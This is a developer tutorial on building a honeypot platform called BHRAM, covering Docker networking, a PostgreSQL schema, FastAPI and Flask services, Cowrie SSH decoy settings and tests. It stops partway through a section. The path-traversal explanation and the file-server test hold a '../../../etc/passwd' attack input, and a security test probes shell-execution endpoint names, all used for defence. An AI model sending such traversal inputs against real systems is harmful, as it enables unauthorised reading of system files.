# BHRAM — Developer Deep Dive
## How I Built This, Step by Step — Everything You Need to Know

> **Purpose of this document**: Teach you exactly how every part of BHRAM was designed and built, what each file does, what each function does, and *why* each decision was made — so you could rebuild this entirely on your own.

---

# PART 0 — Before Writing a Single Line of Code

## The Thinking Process

Before touching code, you need to answer:

1. **What is the attacker seeing?** → SSH server, company website
2. **What is collecting the data?** → Cowrie (SSH), Flask web app
3. **Where is the data going?** → PostgreSQL database
4. **Who reads the data?** → AI/ML agents via BHRAM API
5. **How are services kept isolated?** → Docker networks

Draw this on paper first:

```
ATTACKER → SSH (Cowrie) → logs → (later: DB)
ATTACKER → HTTP (Web App) → logs → (later: DB)

INTERNAL:
  BHRAM API → reads DB → serves AI/ML agents
  File Server → manages decoy files → serves AI/ML agents
  PostgreSQL → stores everything
```

Once you have this mental model, every file decision follows naturally.

---

# PART 1 — Project Skeleton

## Why Docker Compose?

You have 5 services that need to:
- Talk to each other over a private network
- Start in the right order
- Restart if they crash
- Be isolated from the host

Docker Compose handles all of this with one file. Without it, you'd run 5 `docker run` commands manually every time.

## Why a Makefile?

A Makefile is just a list of named shell commands. Instead of remembering:
```bash
docker compose up -d --build
```

You write `make up`. For a project with many commands, this saves enormous time and prevents typos.

### How a Makefile target works

```makefile
up: ## Start all services (detached)
	$(COMPOSE) up -d --build
```

- `up:` — the target name (what you type after `make`)
- `## Start all services` — the help text (used by the `help` target)
- The indented line — the shell command that runs (MUST use a TAB, not spaces)
- `$(COMPOSE)` — a variable defined at the top: `COMPOSE := docker compose`

The `help` target uses `grep` and `awk` to automatically extract all `## comments` and print them. That's why `make help` shows a nice menu.

---

# PART 2 — The `.env.example` File

## What It Does

`.env.example` is a **template** that documents every environment variable the project needs. It contains fake/placeholder values and is committed to git.

The real `.env` file (with actual passwords) is **never committed** — it's in `.gitignore`.

## Why Environment Variables?

You could hardcode `postgres_password = "mypassword"` directly in Python. But then:
- You can't change it without editing code
- If you commit code to GitHub, your password is public
- Each developer needs different values

Environment variables solve all three problems.

## How `make setup` Works

```makefile
setup:
    @if [ ! -f $(ENV_FILE) ]; then \
        cp .env.example $(ENV_FILE); \
    fi
    @mkdir -p data/cowrie/logs data/decoy-files
```

`@` means "don't print this line when running". The `if` checks if `.env` already exists (so it doesn't overwrite it). Then it copies the example file and creates needed directories.

---

# PART 3 — Docker Compose (`compose.yaml`)

## The Three Networks

```yaml
networks:
  frontend:
    driver: bridge
    ipam:
      config:
        - subnet: 172.20.0.0/24

  backend:
    driver: bridge
    ipam:
      config:
        - subnet: 172.21.0.0/24

  internal:
    driver: bridge
    internal: true        # ← KEY SECURITY SETTING
    ipam:
      config:
        - subnet: 172.22.0.0/24
```

- `bridge` = a software switch inside Docker. Containers on the same bridge can talk to each other.
- `subnet` = the IP address range for that network. You pick any private range (RFC 1918).
- `internal: true` = Docker's magic flag. When set, **Docker refuses to create any routing rule between this network and the outside world**. Not even `iptables` can get packets in or out. This is how the database becomes physically unreachable from the internet.

## How Each Service is Connected to Networks

```yaml
services:
  cowrie:
    networks:
      - frontend        # ← attacker can reach it
      # NO backend or internal
```

```yaml
  postgres:
    networks:
      - internal        # ← ONLY on internal. Nothing else connects here.
    # No "ports:" section = no port exposed to host
    expose:
      - "5432"          # exposes port inside Docker networks only
```

**Critical distinction**:
- `ports: "5432:5432"` → exposes to the host machine AND anyone on the network
- `expose: "5432"` → only other Docker containers on the same network can reach it

## `depends_on` with Health Checks

```yaml
  bhram-api:
    depends_on:
      postgres:
        condition: service_healthy
```

This tells Docker: "Don't start `bhram-api` until the `postgres` health check passes." Without this, the API tries to connect to the database before PostgreSQL has finished starting, and it fails.

The health check itself is defined on the postgres service:
```yaml
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U bhram_user -d bhram_db"]
      interval: 10s    # run this check every 10 seconds
      timeout: 5s      # give it 5 seconds to respond
      retries: 5       # after 5 failures, mark as unhealthy
      start_period: 30s # don't count failures in first 30 seconds (init time)
```

## Security Options on Cowrie

```yaml
  cowrie:
    user: "1000:1000"           # run as UID 1000, not root
    cap_drop:
      - ALL                     # drop ALL Linux capabilities
    security_opt:
      - no-new-privileges:true  # cannot gain more privileges via setuid
    tmpfs:
      - /tmp:size=64m           # writable /tmp in RAM (not disk)
```

**Why this matters**: If an attacker somehow exploits Cowrie, they're now in a container with:
- No root access
- No Linux capabilities (can't open raw sockets, can't mount filesystems, etc.)
- Can't escalate privileges
- Temporary files only go to RAM, not host disk

---

# PART 4 — The Database (`database/schema.sql`)

## Why PostgreSQL?

SQLite = one file, no server, no users. Fine for tiny projects.
PostgreSQL = proper RDBMS with types, constraints, JSON support, users, and network access. Required when multiple containers need to connect, and when you want typed data like `INET` for IP addresses.

## SQL Concepts Used

### Extensions

```sql
CREATE EXTENSION IF NOT EXISTS "uuid-ossp";
CREATE EXTENSION IF NOT EXISTS "pgcrypto";
```

PostgreSQL uses extensions to add features. `uuid-ossp` adds the `uuid_generate_v4()` function which generates random UUIDs (Universally Unique Identifiers — 128-bit random IDs). We use these as primary keys instead of integer sequences because:
- UUIDs work across multiple databases without collision
- They don't leak information (sequence 1,2,3 tells the attacker how many records exist)
- They're required for distributed systems (Part 2)

### ENUM Types

```sql
CREATE TYPE deception_mode_enum AS ENUM (
    'baseline', 'passive', 'active', 'aggressive', 'reconstruction'
);
```

An ENUM is a column type where only specific string values are allowed. PostgreSQL will reject any other value at the database level, not just at the application level. This means even if a bug in Python tries to insert `'hacked'` as a deception mode, PostgreSQL refuses it.

### The `users` Table — Annotated

```sql
CREATE TABLE IF NOT EXISTS users (
    id          UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    -- UUID generated automatically if not provided

    username    VARCHAR(64) NOT NULL UNIQUE,
    -- VARCHAR = variable-length string, max 64 chars
    -- NOT NULL = required
    -- UNIQUE = no two rows can have the same value

    full_name   VARCHAR(128) NOT NULL,
    email       VARCHAR(256) NOT NULL UNIQUE,
    department  VARCHAR(64) NOT NULL,
    role        user_role_enum NOT NULL DEFAULT 'intern',
    -- Uses our custom ENUM type. Default is 'intern'.

    is_decoy    BOOLEAN NOT NULL DEFAULT TRUE,
    -- Every user in the system is a fake/bait user. Default TRUE.

    ssh_enabled BOOLEAN NOT NULL DEFAULT FALSE,
    home_dir    VARCHAR(256),
    -- No NOT NULL here = this column can be NULL (optional)

    created_at  TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    -- TIMESTAMPTZ = timestamp WITH timezone. Always store with TZ.
    -- DEFAULT NOW() = auto-set to current time on INSERT

    updated_at  TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    metadata    JSONB NOT NULL DEFAULT '{}'::JSONB
    -- JSONB = JSON stored as binary (faster queries than JSON)
    -- Default is an empty object {}
);
```

### The `events` Table — The Core Telemetry Table

```sql
CREATE TABLE IF NOT EXISTS events (
    id              UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    session_id      UUID REFERENCES attack_sessions(id) ON DELETE SET NULL,
    -- FOREIGN KEY: this links to the attack_sessions table
    -- ON DELETE SET NULL: if the session is deleted, set this to NULL
    -- (don't delete the event, just orphan it)

    event_time      TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    source          VARCHAR(128) NOT NULL,  -- 'cowrie', 'web', 'fileserver'
    category        event_category_enum NOT NULL,
    severity        event_severity_enum NOT NULL DEFAULT 'info',
    event_type      VARCHAR(128) NOT NULL,  -- e.g. 'ssh.login.attempt'
    source_ip       INET,
    -- INET = PostgreSQL's special IP address type. Validates IP format.
    -- Supports both IPv4 and IPv6. Can even do subnet comparisons.

    raw_data        JSONB NOT NULL DEFAULT '{}'::JSONB,
    -- The original event as received from Cowrie/web
    normalized_data JSONB NOT NULL DEFAULT '{}'::JSONB,
    -- The cleaned/normalized version (Part 2 AI fills this)

    analyzed        BOOLEAN NOT NULL DEFAULT FALSE,
    -- Part 2 AI agent sets this to TRUE after processing

    analysis_result JSONB,
    -- Part 2 AI agent writes its findings here
    created_at      TIMESTAMPTZ NOT NULL DEFAULT NOW()
);
```

### Indexes — Why They Matter

```sql
CREATE INDEX IF NOT EXISTS idx_events_session ON events(session_id);
CREATE INDEX IF NOT EXISTS idx_events_time    ON events(event_time DESC);
CREATE INDEX IF NOT EXISTS idx_events_analyzed ON events(analyzed) WHERE analyzed = FALSE;
```

Without indexes, every query scans every row. With 1 million events, `WHERE session_id = 'X'` would read all 1 million rows to find matches.

An index builds a B-tree data structure that allows finding matching rows in O(log n) time instead of O(n).

The last one — `WHERE analyzed = FALSE` — is a **partial index**. It only indexes unanalyzed events. Since once events are analyzed they stay analyzed forever, this index stays small and fast even as the table grows large.

### The `update_updated_at` Trigger

```sql
CREATE OR REPLACE FUNCTION update_updated_at()
RETURNS TRIGGER AS $$
BEGIN
    NEW.updated_at = NOW();   -- NEW = the row being updated
    RETURN NEW;
END;
$$ LANGUAGE plpgsql;

CREATE TRIGGER users_updated_at
    BEFORE UPDATE ON users
    FOR EACH ROW EXECUTE FUNCTION update_updated_at();
```

A trigger is code that runs automatically when something happens. Here: every time any row in `users` is updated, PostgreSQL automatically sets `updated_at = NOW()`. You never have to remember to do it in Python.

---

# PART 5 — The BHRAM API (`services/bhram-api/`)

## File: `app/config.py` — The Settings System

```python
from pydantic_settings import BaseSettings, SettingsConfigDict

class Settings(BaseSettings):
    model_config = SettingsConfigDict(
        env_file=".env",          # read from this file
        case_sensitive=False,     # POSTGRES_HOST == postgres_host
        extra="ignore",           # ignore unknown env vars
    )

    postgres_host: str = "postgres"   # default value if env var not set
    postgres_port: int = 5432

    @property
    def database_url(self) -> str:
        return (
            f"postgresql+asyncpg://{self.postgres_user}:{self.postgres_password}"
            f"@{self.postgres_host}:{self.postgres_port}/{self.postgres_db}"
        )

settings = Settings()  # created once at module load
```

`pydantic-settings` reads environment variables and validates their types. If you set `POSTGRES_PORT=abc` in your `.env`, it raises a clear error: "port must be an integer". The `@property` method assembles the full database URL from individual parts.

The `settings` object is created once and imported everywhere:
```python
from app.config import settings
print(settings.postgres_host)  # "postgres" (from env var or default)
```

## File: `app/database.py` — Async Database Sessions

### Why Async?

FastAPI is built on `asyncio` — Python's cooperative multitasking system. When a request needs to wait for the database, instead of blocking the entire process, Python can handle other requests while waiting. This is essential for high-concurrency web servers.

```python
from sqlalchemy.ext.asyncio import create_async_engine, async_sessionmaker

engine = create_async_engine(
    settings.database_url,      # postgresql+asyncpg://...
    echo=settings.bhram_api_debug,  # log all SQL if in debug mode
    pool_size=5,                # keep 5 connections always open
    max_overflow=10,            # allow 10 extra connections under load
    pool_pre_ping=True,         # test connection before using (avoids stale connections)
)
```

The `engine` is the connection pool — it maintains multiple database connections and hands them out as needed.

### The `get_db` Dependency

```python
async def get_db() -> AsyncGenerator[AsyncSession, None]:
    async with AsyncSessionLocal() as session:
        try:
            yield session          # give the session to the route handler
            await session.commit() # if no exception, commit the transaction
        except Exception:
            await session.rollback() # on error, undo all changes
            raise
        finally:
            await session.close()  # always close the session
```

This is a FastAPI **dependency** — a function that runs before your route handler and provides it with something (here: a database session). The `yield` is the key — it pauses here, lets the route handler run, then continues with commit/rollback/close.

Usage in a route:
```python
async def list_users(db: AsyncSession = Depends(get_db)):
    # db is a live session, automatically committed/closed after
    result = await db.execute(select(User))
```

## File: `app/models.py` — ORM Models

ORM = Object-Relational Mapper. It lets you work with Python objects instead of writing raw SQL.

```python
class User(Base):
    __tablename__ = "users"      # the actual PostgreSQL table name

    id       = Column(UUID(as_uuid=True), primary_key=True, default=uuid.uuid4)
    username = Column(String(64), nullable=False, unique=True)
    role     = Column(Enum(UserRole, name="user_role_enum"), nullable=False)
    metadata_ = Column("metadata", JSONB, nullable=False, default=dict)
    # ↑ "metadata" is a reserved name in SQLAlchemy, so we name the Python
    # attribute metadata_ but map it to the DB column "metadata"
```

### Relationships

```python
class AttackSession(Base):
    events  = relationship("Event", back_populates="session", lazy="select")
    profile = relationship("AttackerProfile", back_populates="sessions")

class Event(Base):
    session = relationship("AttackSession", back_populates="events")
```

`relationship()` tells SQLAlchemy how tables are connected. With this, you can do:
```python
session_obj = await db.get(AttackSession, some_id)
# Access related events: session_obj.events (runs a SELECT automatically)
```

`lazy="select"` means: don't load related data until accessed (lazy loading). This avoids accidentally loading thousands of events when you only want the session.

## File: `app/schemas.py` — Pydantic Schemas

Schemas are separate from models. Models = database structure. Schemas = what the API sends/receives.

```python
class UserSchema(BHRAMBaseModel):
    id:         uuid.UUID
    username:   str
    full_name:  str
    email:      str
    department: str
    role:       str
    is_decoy:   bool
    ssh_enabled: bool
    home_dir:   Optional[str] = None   # Optional = can be None
    created_at: datetime
```

`model_config = ConfigDict(from_attributes=True)` — this tells Pydantic: "you can create this from an ORM object's attributes". So you can do:
```python
user_orm = await db.get(User, some_id)
user_schema = UserSchema.model_validate(user_orm)  # converts ORM → schema
```

### The `EnvironmentStateSchema.from_orm_state` Factory Method

```python
@classmethod
def from_orm_state(cls, orm_obj: Any) -> "EnvironmentStateSchema":
    state = orm_obj.state or {}   # the JSONB column from PostgreSQL
    return cls(
        id=orm_obj.id,
        deception_mode=orm_obj.deception_mode.value,
        company=state.get("company", "BHRAM Technologies"),
        services=state.get("services", []),
        # ...
    )
```

A `@classmethod` is an alternative constructor — called on the class itself, not an instance. Here it builds the schema by extracting fields from both the ORM object AND its nested JSONB `state` field. This is the "adapter" pattern — it adapts the database format to the API response format.

## Files: `app/routes/` — Route Handlers

### `environment.py` — The AI/ML Team's Primary Interface

```python
router = APIRouter(prefix="/api/v1", tags=["Environment"])

@router.get("/environment", response_model=EnvironmentStateSchema)
async def get_environment(db: AsyncSession = Depends(get_db)):
    result = await db.execute(
        select(EnvironmentState)
        .where(EnvironmentState.is_current == True)  # only the current snapshot
        .order_by(EnvironmentState.snapshot_time.desc())  # most recent first
        .limit(1)  # just one record
    )
    env_state = result.scalar_one_or_none()
    # scalar_one_or_none() = return the single result, or None if empty

    if env_state is None:
        raise HTTPException(status_code=503, detail="No current environment state")

    return EnvironmentStateSchema.from_orm_state(env_state)
```

`select(EnvironmentState)` is SQLAlchemy's async query builder. It builds:
```sql
SELECT * FROM environment_state
WHERE is_current = TRUE
ORDER BY snapshot_time DESC
LIMIT 1
```

`response_model=EnvironmentStateSchema` tells FastAPI to:
1. Take the return value
2. Run it through the schema's validator
3. Serialize it to JSON
4. Set the right `Content-Type: application/json` header

### `users.py` — Filtered Queries

```python
@router.get("/users", response_model=UserListResponse)
async def list_users(
    department: Optional[str] = Query(None),  # ?department=Engineering
    role: Optional[str] = Query(None),         # ?role=developer
    ssh_enabled: Optional[bool] = Query(None), # ?ssh_enabled=true
    db: AsyncSession = Depends(get_db),
):
    query = select(User).order_by(User.username)

    if department:
        query = query.where(User.department.ilike(f"%{department}%"))
        # ilike = case-insensitive LIKE
        # f"%{department}%" = match anywhere in the string

    result = await db.execute(query)
    users = result.scalars().all()
    # .scalars() = unwrap from result rows → ORM objects
    # .all() = return as a list
```

`Query(None)` = a FastAPI query parameter. `None` is the default. FastAPI reads it from the URL: `/api/v1/users?department=Engineering`.

## File: `app/main.py` — The FastAPI Application

```python
app = FastAPI(
    title="BHRAM API",
    version=settings.app_version,
    docs_url="/docs",        # Swagger UI
    redoc_url="/redoc",      # ReDoc UI
    openapi_url="/openapi.json",  # Machine-readable API spec
)
```

FastAPI automatically generates interactive API documentation from your route handlers and Pydantic schemas. No extra work needed.

### Middleware

```python
@app.middleware("http")
async def add_process_time_header(request: Request, call_next):
    start = time.perf_counter()
    response = await call_next(request)  # run the actual route handler
    elapsed = (time.perf_counter() - start) * 1000
    response.headers["X-Process-Time-Ms"] = f"{elapsed:.2f}"
    return response
```

Middleware wraps every request. Here we time how long each request takes and add it as a response header. Useful for debugging slow endpoints.

### The Health Endpoint — Database Ping Pattern

```python
@app.get("/health")
async def health_check() -> dict:
    try:
        t0 = time.perf_counter()
        async with get_db_context() as db:
            await db.execute(text("SELECT 1"))  # simplest possible query
        db_latency = (time.perf_counter() - t0) * 1000

        service_statuses.append({
            "name": "postgres",
            "status": "healthy",
            "latency_ms": round(db_latency, 2),
        })
    except Exception as exc:
        overall_status = "degraded"
        service_statuses.append({
            "name": "postgres",
            "status": "unhealthy",
            "error": str(exc)[:200],  # truncate to avoid huge error messages
        })
```

`text("SELECT 1")` — the simplest possible SQL. If the database is reachable and working, this query takes ~1ms. If it fails, we catch the exception and report `degraded` instead of crashing.

---

# PART 6 — The Web Application (`services/web/`)

## Flask Application Factory Pattern

```python
def create_app() -> Flask:
    app = Flask(__name__)
    app.secret_key = os.environ.get("FLASK_SECRET_KEY", "devsecret")
    # secret_key is used to sign session cookies and flash messages

    @app.context_processor
    def inject_globals():
        return {
            "company_name": "BHRAM Technologies",
            "year": datetime.now().year,
            "intranet_host": "intranet.bhram-technologies.internal",
            # These variables are available in ALL templates automatically
        }

    @app.route("/")
    def index():
        return render_template("index.html")

    return app
```

**Why the factory pattern?** Instead of `app = Flask(__name__)` at module level, you wrap it in a function. Benefits:
- Easier to test (create multiple instances with different configs)
- Avoids circular imports
- Gunicorn can call `create_app()` to get the app instance

### The Login Honeypot — Critical Security Design

```python
@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username", "")[:64]
        # [:64] = limit to 64 characters (prevent memory attacks)

        # DELIBERATELY always fail — no real auth ever happens
        flash("Invalid username or password.", "danger")
        return render_template("login.html", failed=True)

    return render_template("login.html", failed=False)
```

The login page **never authenticates anyone**. It always returns "invalid credentials". This is intentional — it's a honeypot. In Part 2, the flash message handler will log the username/password attempt to the database as a telemetry event.

## Jinja2 Templating — `base.html`

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <title>{% block title %}BHRAM Technologies{% endblock %}</title>
    <!--
    {% block ... %} = a named slot that child templates can fill in
    If no child fills it, the default value is used
    -->
</head>
<body>
    <nav>...</nav>

    {% with messages = get_flashed_messages(with_categories=true) %}
    {% if messages %}
        {% for category, message in messages %}
        <div class="flash flash-{{ category }}">{{ message }}</div>
        {% endfor %}
    {% endif %}
    {% endwith %}
    <!--
    get_flashed_messages() reads messages set by flash() in Python.
    "with_categories=true" means you also get the category (success/danger/info)
    so you can style them differently
    -->

    <main>
        {% block content %}{% endblock %}
        <!-- Child templates put their content here -->
    </main>
</body>
</html>
```

A child template like `index.html` uses:
```html
{% extends "base.html" %}
{% block title %}Home — BHRAM Technologies{% endblock %}
{% block content %}
  <h1>Welcome</h1>
  <!-- Only this section changes between pages -->
{% endblock %}
```

This is **template inheritance** — write the nav/footer once, reuse everywhere.

### Context Variables

In `base.html`:
```html
<p>{{ intranet_host }}</p>
```

The `{{ ... }}` syntax outputs a variable. `intranet_host` comes from the `inject_globals()` context processor — it's injected into every template automatically. Attackers who view source code will see `intranet.bhram-technologies.internal` — a deception artifact.

## CSS Design System — Dark Theme

```css
:root {
  --bg:     #0a0e1a;       /* main background: very dark navy */
  --accent: #0ea5e9;       /* sky blue accent color */
  --text:   #e2e8f0;       /* main text: light grey */
  --text-muted: #7c93b5;   /* secondary text: muted blue-grey */
  --border: #1e2d4a;       /* card borders: dark blue */
  --font-sans: 'Inter', sans-serif;   /* modern, clean font */
  --font-mono: 'JetBrains Mono', monospace;  /* code blocks */
}
```

CSS custom properties (variables) let you define your color palette once and use it everywhere. Change `--accent` in one place to retheme the entire site.

```css
.hero-gradient {
    background: linear-gradient(135deg, #0ea5e9 0%, #6366f1 60%, #8b5cf6 100%);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
}
```

This creates the colorful gradient text effect on the hero heading. The `background-clip: text` clips the gradient to only show where text pixels are. `text-fill-color: transparent` makes the text itself transparent so the gradient shows through.

```css
.badge-dot {
    width: 6px; height: 6px;
    background: #10b981;
    animation: pulse 2s ease-in-out infinite;
}
@keyframes pulse {
    0%, 100% { opacity: 1; }
    50%       { opacity: 0.4; }
}
```

The pulsing green dot animation — defined as a CSS keyframe animation. It fades in and out over 2 seconds, looping forever, giving the site a "live" feeling.

---

# PART 7 — Cowrie SSH Honeypot (`services/cowrie/`)

## What Cowrie Is

Cowrie is an open-source medium-interaction SSH/Telnet honeypot. "Medium interaction" means:
- It presents a real-looking SSH server
- It has a fake shell (bash emulator) that responds to commands
- But it's NOT a real shell — it can't execute real system commands
- It logs everything: keystrokes, commands, file uploads, downloads

## The `cowrie.cfg` Configuration

```ini
[honeypot]
hostname = bhram-prod-srv01
# The fake hostname the attacker sees when they log in.
# "prod-srv01" sounds like a production server — a believable target.

ssh_version_string = SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.7
# The banner that appears before login. Matches real Ubuntu 22.04 LTS.
# An experienced attacker will fingerprint this to understand the target.

[output_jsonlog]
enabled = true
logfile = /home/cowrie/var/log/cowrie/cowrie.json
# JSON log is machine-readable — perfect for Part 2 telemetry pipeline
```

## The `userdb.txt` File

```
# FORMAT: username:uid:password
root:0:*
admin:1000:*        # * means accept ANY password
admin:1000:admin    # OR accept the specific password "admin"
```

Wait — why both `admin:1000:*` AND `admin:1000:admin`?

`*` = accept any password. But in Cowrie, multiple lines for the same user means "accept any of these". So admin can log in with any password (the `*` line), which maximizes the chance the attacker gets in — that's what we want! We want them inside so Cowrie can observe them.

## The HoneyFS (Fake Filesystem)

The `honeyfs/` directory structure maps to what the attacker sees inside the fake shell:

```
honeyfs/
└── home/
    └── admin/
        └── vpn_config.txt    ← ls /home/admin/ shows this file
```

When the attacker types `ls /home/admin/` inside Cowrie, they see `vpn_config.txt`. When they type `cat /home/admin/vpn_config.txt`, they get the content of our fake file. Cowrie reads from the `honeyfs/` directory.

## The Decoy Files — Design Principles

Each file is crafted to be:
1. **Believable** — realistic format, plausible content
2. **Attractive** — looks valuable to an attacker
3. **Safe** — contains only fictional data

### `vpn_config.txt` — Why It's Bait Level 4

```
[Interface]
PrivateKey = FAKE_PRIVATE_KEY_NOT_REAL_bHi4fXLkCzR9mNpQvWsYjEaOgTdU2IwK=
Address = 10.8.0.47/24
DNS = 10.8.0.1

[Peer]
PublicKey = FAKE_PUBLIC_KEY_NOT_REAL_XR4kP9vLmY2aQdTjNsIuEwBgHfOcZ7Wt=
Endpoint = vpn.bhram-technologies.internal:51820
```

A real WireGuard VPN config looks exactly like this. An attacker who finds this thinks they've found real VPN credentials. The `FAKE_*_NOT_REAL_*` prefix makes it unambiguous this is fictional — but an attacker wouldn't know that from the format alone.

### `network_inventory.txt` — Why It's Bait Level 4

A full internal IP map is one of the most valuable things an attacker can find:
- It reveals what systems exist
- It reveals what software runs on them
- It helps plan lateral movement

Our fake one lists: firewalls, core switches, GitLab, Grafana, Vault, Kubernetes masters, PostgreSQL primary/replica, Redis, Kafka — everything that should be in a real tech company's network.

---

# PART 8 — The File Server (`services/fileserver/app.py`)

## Why a Separate File Server?

The Cowrie filesystem is static — it's baked into the container image. The file server is **dynamic** — the AI/ML orchestrator can add, remove, and modify files at runtime. This is how Part 2 will implement "adaptive deception" — change the bait based on attacker behavior.

## Path Traversal Protection

```python
def safe_path(relative: str) -> Path:
    resolved = (FILE_ROOT / relative.lstrip("/")).resolve()
    # .resolve() = follow all symlinks, remove .., normalize path

    if not str(resolved).startswith(str(FILE_ROOT)):
        raise HTTPException(status_code=400, detail="Path traversal rejected")
    return resolved
```

**The attack this prevents**: An attacker (or a bug) sends `filepath = "../../etc/passwd"`.

Without protection:
```python
Path("/srv/company-files") / "../../etc/passwd"
# = /srv/company-files/../../etc/passwd
# = /etc/passwd  ← reads real system file!
```

With `.resolve()`:
```python
Path("/srv/company-files/../../etc/passwd").resolve()
# = /etc/passwd

str("/etc/passwd").startswith("/srv/company-files")
# = False → raises HTTPException
```

The check is simple but bulletproof: after resolving all `..` navigation, the final path must still be inside the file root.

## The Pydantic Validator for Paths

```python
class DecoyFileCreate(BaseModel):
    filepath: str

    @field_validator("filepath")
    @classmethod
    def validate_path(cls, v: str) -> str:
        p = Path(v)
        if ".." in p.parts:          # check for traversal BEFORE resolve
            raise ValueError("Directory traversal detected in filepath")
        return v
```

This is a **Pydantic validator** — it runs when the request body is parsed, before any handler code. Double protection: caught at the input model level AND in `safe_path()`.

## The Orchestrator API — How Part 2 Will Use It

```python
@app.post("/files/create", status_code=201)
async def create_decoy_file(payload: DecoyFileCreate):
    target = safe_path(payload.filepath)
    target.parent.mkdir(parents=True, exist_ok=True)
    # parents=True = create all intermediate directories
    # exist_ok=True = don't error if directory already exists

    async with aiofiles.open(target, "w", encoding="utf-8") as f:
        await f.write(payload.content)
    # aiofiles = async file I/O (doesn't block the event loop)
```

In Part 2, when the AI detects an attacker is searching for database backup files, it can call:
```bash
POST /files/create
{
  "filename": "db_backup_urgent.sql.gz",
  "filepath": "home/admin/urgent/db_backup_urgent.sql.gz",
  "content": "-- URGENT BACKUP...",
  "bait_level": 5
}
```

This creates the file immediately, without redeploying any containers.

---

# PART 9 — The Test Suite (`tests/`)

## `conftest.py` — Shared Setup

```python
@pytest.fixture(scope="session")
def api_url() -> str:
    return BHRAM_API_URL
```

`scope="session"` = this fixture is created once for the entire test session (not for each test). Since the API URL doesn't change, we don't need to recreate it.

A `fixture` in pytest is a function that provides something to your tests. You declare you need it by putting it in the function signature:
```python
def test_health(session: requests.Session, api_url: str):
    # session and api_url come from fixtures in conftest.py
    r = session.get(f"{api_url}/health")
```

## `test_unit.py` — Structure Tests

```python
class TestProjectStructure:
    BASE = os.path.join(os.path.dirname(__file__), "..")
    # __file__ = path of this test file
    # ".." = one directory up (to the bhram/ root)

    def _exists(self, *parts) -> bool:
        return os.path.exists(os.path.join(self.BASE, *parts))

    def test_compose_yaml_exists(self):
        assert self._exists("compose.yaml"), "compose.yaml not found"
```

These tests verify that all required files exist in the repository. They run in ~0.03 seconds with no external dependencies. Run these in CI even before Docker is available.

## `test_api.py` — Integration Tests

### Security Boundary Test

```python
def test_database_not_exposed_to_frontend(self, session, api_url):
    r = session.get(f"{api_url}/api/v1/services")
    data = r.json()
    for svc in data["services"]:
        if svc["name"] == "postgres":
            assert svc["network"] == "internal", (
                "SECURITY: Postgres is NOT on the internal network!"
            )
```

This test reads the services from the API and verifies that PostgreSQL is registered on the `internal` network. If someone accidentally changed the compose.yaml to put postgres on `frontend`, this test catches it.

### Shell Execution Security Test

```python
def test_no_shell_execution_endpoint(self, session, api_url):
    dangerous_paths = ["/exec", "/shell", "/cmd", "/run", "/execute"]
    for path in dangerous_paths:
        r = session.get(f"{api_url}{path}", timeout=5)
        assert r.status_code in {404, 405}, (
            f"SECURITY: Dangerous path {path} returned {r.status_code}!"
        )
```

This test tries to access paths that would be dangerous if they existed. If any of them return `200`, the test fails with a security warning message.

## `test_fileserver.py` — Path Traversal Test

```python
def test_path_traversal_rejected(self, session, fileserver_url):
    payload = {
        "filename": "evil.txt",
        "filepath": "../../../etc/passwd",  # ← attack attempt
        "content": "attacker content",
    }
    r = session.post(f"{fileserver_url}/files/create", json=payload)
    assert r.status_code in {400, 422}, (
        f"SECURITY: Path traversal was not rejected! Got {r.status_code}"
    )
```

`422 Unprocessable Entity` is FastAPI's validation error code — returned when Pydantic rejects the input. The test accepts both `400` and `422` because either means the attack was blocked.

---

# PART 10 — The Database Schema in `seed.sql`

## What Seeding Is

When PostgreSQL starts with a fresh volume, it runs all SQL files in `/docker-entrypoint-initdb.d/` in alphabetical order:
1. `01_schema.sql` — creates tables
2. `02_seed.sql` — inserts initial data

Without seeding, the API would return empty lists on first start.

## The Environment State Seed

```sql
INSERT INTO environment_state (deception_mode, is_current, state, notes) VALUES (
    'baseline',
    TRUE,
    '{
        "company": "BHRAM Technologies",
        "deception_mode": "baseline",
        "services": [...],
        "users": [...],
        "active_decoys": 10,
        "network": {"frontend_subnet": "172.20.0.0/24", ...}
    }'::JSONB,
    'Initial Part 1 baseline state'
);
```

`::JSONB` is PostgreSQL's **cast operator** — it converts the string `'{...}'` to the JSONB binary type. The `state` column stores the entire environment as a single JSON document, making it easy for the AI/ML team to read the complete state in one query.

---

# PART 11 — How Everything Connects on First Start

Here is the exact sequence of events when you run `make up`:

```
1. docker compose reads compose.yaml
2. Creates 3 Docker networks (frontend, backend, internal)
3. Creates 3 Docker volumes (postgres_data, cowrie_logs, company_files)

4. Starts postgres first (healthcheck begins):
   - Runs docker-entrypoint.sh
   - Creates database + user from env vars
   - Runs /docker-entrypoint-initdb.d/01_schema.sql  → creates 8 tables
   - Runs /docker-entrypoint-initdb.d/02_seed.sql    → inserts data
   - pg_isready starts returning 0 (healthy)

5. bhram-api starts (waits for postgres healthcheck):
   - pip install already done during build
   - uvicorn launches: "Uvicorn running on 0.0.0.0:8000"
   - create_async_engine() creates connection pool
   - First GET /health pings the database

6. web starts:
   - gunicorn launches Flask app
   - All routes registered

7. fileserver starts:
   - uvicorn launches FastAPI app
   - Creates /srv/company-files directory if needed

8. cowrie starts:
   - Loads cowrie.cfg
   - Generates SSH host keys (first run)
   - Loads userdb.txt
   - Reads honeyfs/ directory
   - Listens on port 2222
```

---

# PART 12 — Key Python Concepts Used

## `async`/`await` — Why It's Everywhere

```python
# Synchronous (old way) — blocks the entire process
def get_users():
    result = db.execute("SELECT * FROM users")  # blocks here
    return result.fetchall()

# Asynchronous (BHRAM way) — yields control while waiting
async def get_users():
    result = await db.execute(select(User))  # yields control, doesn't block
    return result.scalars().all()
```

When you `await` something, Python says "I'll wait for this, but other requests can run in the meantime". This is why FastAPI can handle many concurrent requests with a single process.

## `Optional[str]` Type Hints

```python
from typing import Optional

class UserSchema(BaseModel):
    home_dir: Optional[str] = None   # can be a string OR None
```

`Optional[X]` is exactly equivalent to `Union[X, None]`. It tells Python (and Pydantic) that this field can hold either the type OR `None`.

## `@classmethod` vs Regular Method vs `@staticmethod`

```python
class EnvironmentStateSchema(BaseModel):
